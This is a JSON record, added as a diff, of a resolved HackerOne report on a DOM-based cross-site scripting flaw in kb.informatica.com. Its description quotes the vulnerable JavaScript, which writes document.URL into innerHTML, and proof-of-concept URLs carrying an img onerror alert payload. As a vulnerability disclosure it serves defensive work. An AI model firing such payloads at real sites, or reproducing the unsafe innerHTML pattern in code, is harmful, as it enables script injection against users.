@@ -1,0 +1,134 @@
+{
+  "id": 156166,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTYxNjY=",
+  "url": "https://hackerone.com/reports/156166",
+  "title": "[kb.informatica.com] Dom Based xss",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-08-02T20:04:02.673Z",
+  "submitted_at": "2016-08-02T20:04:02.673Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "e3xpl0it",
+    "url": "/e3xpl0it",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/004/9f2f4e75ea8fe39282acc5d0f75f74a041510a82_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-08-17T09:48:13.150Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-18T09:48:10.167Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi! I found Dom based xss on this subdomain https://kb.informatica.com\njavaScript security is very important, even more in portals where users store their personal data. \nAttackers can target those portals to find and exploit High-risk JavaScript vulnerabilities like Dom based xss vulnerabilities\n\nPOC ,the vulnerable code javascript on this page https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?\nview-source: string 1406 /*google chrome\n\nvar li = document.createElement(\"li\");\nstrChild = \"<a href=\"+document.URL+\" style='color:#fff !important;font-size:10px'>Search Results</a>\";\nli.innerHTML = strChild; document.getElementById('DynamicBreadcrumb').appendChild(li);\n} \n\nattack scenario the latest versions of browsers\ngoogle chrome https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#\"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek\nIE 11  https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#\"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek \n",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 109214,
+      "file_name": "Chrome-Dom_XSS.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/109/214/f076ce870906640fef37dfb028d672f05b663e33/Chrome-Dom_XSS.jpg?response-content-disposition=attachment%3B%20filename%3D%22Chrome-Dom_XSS.jpg%22%3B%20filename%2A%3DUTF-8%27%27Chrome-Dom_XSS.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ56IR27L%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC2lMRFmWCHhr%2BJNECl1sGrPTozu0B4CqSvp1JYeOWk2wIgHw%2Fug30iKOYlnLieSD7VpW6F4NwXgU4T0n5ovzArnooqsQUIFhADGgwwMTM2MTkyNzQ4NDkiDP%2B9pvCpDtieepJDKSqOBax3xK1OGSOoPE8oe0TypxR5JdRZH80bP8p6qTxkjMdLG4TmpG94B1w70DAkUnocUI0cCciCUWKQ%2FRB9HnZsLClWO8OYSC6QLzfoEb8WcfAapWbumEz5q2ryMSqIDDnww%2F6Vw3SlcghwenfpyrzvXevVVxwU8W3XTYD4BvmYwvy3hQE%2B37uOncdpd4Q%2BR9lklPHry7mp7Ixi%2FK9j1fKl0QS7HJxDgppew5z4SvwUKDi7174ZG0T%2BTxal148HJfLWX%2BhkRjGLJINti7gFw5eQUMW6WF9jdcF8S4EZAcEZBoqJ8m9aZOk%2B9FyEb8SxGzy13lJmAsCeArUopzv0idL1OklAImbVRCP1kjM8J8jFd73gXH2l8QxTvDPv3pKTUSIYjmYt64MXXEiYUO3KE4TNVqvheCB252c0V4ybMU94u0D9Xo5MKHRbelJ5JauOmDNbncclw2uuh8eHMoY%2FDAPd0XKXcSfSw8LWYZ4nKM3LMVdv52%2BKK9N7dy4Y%2FCtCDdPSGau4mTczSSp9Lndj2Q%2BV9AELP4YseVg3RYdTkr2PMAWPPztBFCSPj1mn2YlRRvWr%2Fa%2FLsUAeXgk3BK5cown4gRLLCXsX7OfSAUC1P63Sm0kuIxR9gXo62kR79mVOPDCUIA8k9d%2BgYf8jQVAHyx%2FkqlCXtlWmruVxEMq%2FCAD7A8g1dQMfGIbkfhL1U9you6bgwDrkW7JryqyBW0qTinPQKn3F4uC1R%2FdJjdlKD%2FzAVrzk53FQBJOkzBB5uYz5QEf5fzX1KH6pQkWZZxuhTji9WUHt5AUVOxT5PuN72SZZU9NbUb%2F3EsjRmB%2BkuBMEEjvqLnrUSy%2BJx%2FD2AOvpZmTo4XuO8jGVuB3K6B123%2Fj0%2BDC64b%2FGBjqxAVVzGvBjg86Wgaiw5L%2BJWXtWyMpuvK4lXSUzZeh1Mdq%2FjUp0bD34CobaDfqUopt%2B43hiZUiUlv2pVrrU4N8w181naJ6Xysk2%2BA%2B%2F57W4TMMh1XzOPoQcsMkgS%2B26RLk7qetiNdR8f11wjD1t38c5RQSMd28QyFJJA5GzLKaa50WzF8%2F73dYchgyraDeMJW5UdfhRXErV%2FTZoMaAwUAgTlbr79kSNnYdejSAPOwqwDIqfjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=28447d3b629eb889a5d90023e4765e8e20a1bae18f63975b8b8a712eef0d2783",
+      "file_size": 104926,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 109215,
+      "file_name": "IE-11_Dom_xss.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/109/215/495517d3b07f1dba8bf13de9ec4052ef16083a37/IE-11_Dom_xss.jpg?response-content-disposition=attachment%3B%20filename%3D%22IE-11_Dom_xss.jpg%22%3B%20filename%2A%3DUTF-8%27%27IE-11_Dom_xss.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ56IR27L%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T145548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC2lMRFmWCHhr%2BJNECl1sGrPTozu0B4CqSvp1JYeOWk2wIgHw%2Fug30iKOYlnLieSD7VpW6F4NwXgU4T0n5ovzArnooqsQUIFhADGgwwMTM2MTkyNzQ4NDkiDP%2B9pvCpDtieepJDKSqOBax3xK1OGSOoPE8oe0TypxR5JdRZH80bP8p6qTxkjMdLG4TmpG94B1w70DAkUnocUI0cCciCUWKQ%2FRB9HnZsLClWO8OYSC6QLzfoEb8WcfAapWbumEz5q2ryMSqIDDnww%2F6Vw3SlcghwenfpyrzvXevVVxwU8W3XTYD4BvmYwvy3hQE%2B37uOncdpd4Q%2BR9lklPHry7mp7Ixi%2FK9j1fKl0QS7HJxDgppew5z4SvwUKDi7174ZG0T%2BTxal148HJfLWX%2BhkRjGLJINti7gFw5eQUMW6WF9jdcF8S4EZAcEZBoqJ8m9aZOk%2B9FyEb8SxGzy13lJmAsCeArUopzv0idL1OklAImbVRCP1kjM8J8jFd73gXH2l8QxTvDPv3pKTUSIYjmYt64MXXEiYUO3KE4TNVqvheCB252c0V4ybMU94u0D9Xo5MKHRbelJ5JauOmDNbncclw2uuh8eHMoY%2FDAPd0XKXcSfSw8LWYZ4nKM3LMVdv52%2BKK9N7dy4Y%2FCtCDdPSGau4mTczSSp9Lndj2Q%2BV9AELP4YseVg3RYdTkr2PMAWPPztBFCSPj1mn2YlRRvWr%2Fa%2FLsUAeXgk3BK5cown4gRLLCXsX7OfSAUC1P63Sm0kuIxR9gXo62kR79mVOPDCUIA8k9d%2BgYf8jQVAHyx%2FkqlCXtlWmruVxEMq%2FCAD7A8g1dQMfGIbkfhL1U9you6bgwDrkW7JryqyBW0qTinPQKn3F4uC1R%2FdJjdlKD%2FzAVrzk53FQBJOkzBB5uYz5QEf5fzX1KH6pQkWZZxuhTji9WUHt5AUVOxT5PuN72SZZU9NbUb%2F3EsjRmB%2BkuBMEEjvqLnrUSy%2BJx%2FD2AOvpZmTo4XuO8jGVuB3K6B123%2Fj0%2BDC64b%2FGBjqxAVVzGvBjg86Wgaiw5L%2BJWXtWyMpuvK4lXSUzZeh1Mdq%2FjUp0bD34CobaDfqUopt%2B43hiZUiUlv2pVrrU4N8w181naJ6Xysk2%2BA%2B%2F57W4TMMh1XzOPoQcsMkgS%2B26RLk7qetiNdR8f11wjD1t38c5RQSMd28QyFJJA5GzLKaa50WzF8%2F73dYchgyraDeMJW5UdfhRXErV%2FTZoMaAwUAgTlbr79kSNnYdejSAPOwqwDIqfjQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d0be94df7c578c9c388ac13a34451678779a0793e5156e798ba825bf9271a217",
+      "file_size": 99121,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-08-17T09:48:10.226Z",
+  "allow_singular_disclosure_after": -192431258.6198265,
+  "singular_disclosure_allowed": true,
+  "vote_count": 23,
+  "voters": [
+    "v3ntur4x",
+    "0xtarun",
+    "trieulieuf9",
+    "ali",
+    "sameerphad72",
+    "eveeez",
+    "khizer47",
+    "bb00x",
+    "cryptographer",
+    "egxd",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
